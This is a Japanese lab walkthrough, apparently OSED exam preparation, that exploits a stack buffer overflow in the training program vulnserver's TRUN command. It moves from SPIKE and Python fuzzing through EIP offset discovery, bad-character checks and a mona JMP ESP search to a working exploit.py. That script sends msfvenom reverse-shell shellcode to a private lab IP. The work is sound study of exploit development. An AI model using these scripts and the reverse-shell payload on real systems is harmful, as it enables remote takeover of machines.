### 動作確認
`vulnserver.exe`を起動するだけでおk
![[Pasted image 20240725233815.png]]

接続の確認
```sh
nc -nv 192.168.40.47 9999
```
![[Pasted image 20240725233729.png]]

---
### デバッグの準備
`immunity Debugger`でAttachしてデバッグする。
![[Pasted image 20240725233848.png]]

適当に選択してAttachするだけでおｋ
![[Pasted image 20240725233923.png]]

Attach後は一度<font color="#ff0000">▶</font>を選択してブレークモードから抜ける。
![[Pasted image 20240725233956.png]]

---

### SPIKEを使用して脆弱性チェックをする。

`check.spk`
```c:check.spk
s_readline();
s_string("TRUN ");
s_string_variable("A");
```

- `s_readline()` : 接続後に、`Welcome to Vulnerable Server! ....`のレスポンスを受け取るために使用
- `s_string("TRUN ");` : 脆弱な機能が`TRUN `みたいなので、コマンドを設定
- `s_string_variable("A");` : なんでもいいと思う、Aとかでも成功する。（BoF用文字？）

`spk`ファイル作成後、`vulnserver`に対しコマンドを実行
⇒クラッシュしたら成功
```sh
generic_send_tcp 192.168.40.47 9999 ./check.spk A 0
```
![[Pasted image 20240725235740.png]]

アタッチ画面が消え、`vulnserver`は応答しなくなった⇒クラッシュしている。
![[Pasted image 20240725235720.png]]

このとき`EAX`レジスタの値が以下のようになっている。
```
TRUN /.:/AAAAAAAAAAAAAAAAA.......
```
`EAX`は関数の戻り値や命令の引数で入るので、Aが入るのは正常なはず。
**`EBP`（関数のベースアドレス）が`41414141(AAAA)`で上書きされてしまっている。**
**`EIP`（次に呼ばれる命令アドレス）が`41414141(AAAA)`で上書きされてしまっている。**
⇒クラッシュしたのは、次の命令がおかしくなったため（**EIPが上書きされたため**）と推測できる。
![[Pasted image 20240725235816.png]]

---

### 脆弱箇所特定用のファジング

何バイト目でクラッシュするか調査するために、100バイトずつ増やして送信していく。
`time.sleep`を１秒にしているが、小さすぎるとずれる場合がある（レスポンスタイムの問題？）
`fuzzing.py`
```python
import socket
import sys
import time

buffer = b"A" * 100
while True:  
  try:  
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('192.168.40.47',9999))
    s.send((b'TRUN /.:/' + buffer))  
    s.close()  
    time.sleep(1)  
    buffer = buffer + b"A"*100
  except Exception as e:
    print(e)  
    print("Fuzzing has crashed at {0} bytes".format(str(len(buffer))))
    sys.exit()
```

大体2000バイト程度でクラッシュすることがわかった。
![[Pasted image 20240726004238.png]]

今度は１バイトずつにして投げてみる。
```python
import socket
import sys
import time

buffer = b"A" * 2000
while True:  
  try:  
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('192.168.40.47',9999))
    s.send((b'TRUN /.:/' + buffer))  
    s.close()  
    time.sleep(1)  
    buffer = buffer + b"A"*1
  except Exception as e:
    print(e)  
    print("Fuzzing has crashed at {0} bytes".format(str(len(buffer))))
    sys.exit()
```
![[Pasted image 20240726010426.png]]

---

### EIPが書き換えられるバイト位置の特定

`pattern_create`で生成したバイト文字を使って再度実行する。
```python
import socket
import sys
import time
import subprocess

buffer = subprocess.check_output(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000"],shell=True)

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + buffer))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
```
![[Pasted image 20240726005330.png]]

クラッシュ後のEIPは`386F4337`になった。
これを`pattern_offset.rb`で何バイト目なのかを検索する。
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
```
![[Pasted image 20240726010436.png]]
結果から2003バイト目以降がEIPの値であるとわかった。
（2004~2007バイト）


あっているか確認するために Aを2003バイト分、Bを4バイト分送信してみる。
```python
import socket
import sys

buffer = b"A"*2003
buffer += b"BBBB"

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + buffer))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
```

結果からEIPがBの値（42）で埋められていることがわかる。
![[Pasted image 20240727160439.png]]

---
### BadCharの特定

使えない文字があるかを検索するため、再度ペイロードを送信してクラッシュ後のメモリをみる。
ここで抜けている文字があったら、その文字はペイロードとして使えない。
送信するのは`0x01`～`0xFF`
```python
import socket
import sys

badchars  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = b"A"*2003
buffer += b"B" * 4
buffer += badchars

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + buffer))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
```

クラッシュ後、すべての文字がメモリ上に連番で並んでいることが確認できる。
⇒ BadCharはない（あった場合はその文字以降がなくなる？）
![[Pasted image 20240727164409.png]]

---
### monaでJMP位置の特定

EIP(次に実行するアセンブリのアドレス)を書き換えるためJMP先を決める。
ESPにペイロードを置いて、ESPにジャンプさせるので、`jmp esp`の命令コードを確認する。

```sh
┌──(kali㉿kali)-[~/OSED]
└─$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```
![[Pasted image 20240727171713.png]]

使用する命令コードがわかったので、monaを起動し検索する。
monaの起動
```
!mona modules
```
![[Pasted image 20240727164517.png]]
![[Pasted image 20240727164636.png]]

`nasm_shell`で判明した命令コード`FFE4`で検索する。
```
!mona find -s '\xff\xe4' -m essfunc.dll
```
![[Pasted image 20240727164657.png]]

以下の候補が使用できる。
とりま一番上の`625011AF`を使用する。
```
625011AF     0x625011af 
625011BB     0x625011bb 
625011C7     0x625011c7 
625011D3     0x625011d3 
625011DF     0x625011df 
625011EB     0x625011eb 
625011F7     0x625011f7 
62501203     0x62501203 
62501205     0x62501205 
```

<font color="#245bdb">⇒■</font>を選択して、`625011AF`を検索、`F2キー`を押してブレークポイントを設定する。
検索するときは2回くらいやらないとだめかも
![[Pasted image 20240727165314.png]]

F2でブレークポイントを設定
![[Pasted image 20240727165437.png]]

今度はEIPを`625011AF`にしてちゃんと書き換わるかを確認する。
```python
import socket
import sys

jmp_addr =  b"\xaf\x11\x50\x62"
buffer = b"A"*2003
payload = buffer + jmp_addr

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + payload))  
  s.close()  
except Exception as e:
  print(e)  
  sys.exit()
```
![[Pasted image 20240727165751.png]]

---
### Exploitの作成

`EIP`の特定、JMP先の特定ができたので、今度はESPをシェルコードに書きかえて、リバースシェルを取得する。
```python : exploit.py
import socket
import sys
import subprocess

buf = subprocess.check_output(['msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.50 LPORT=4444 -f raw -a x86 -b "\\x00"'],shell=True)
nop = b"\x90" * 32 
jmp_addr = b"\xaf\x11\x50\x62"
buffer = b"A"*2003
payload = buffer + jmp_addr + nop + buf

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + payload))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
```

できた！
![[Pasted image 20240727174256.png]]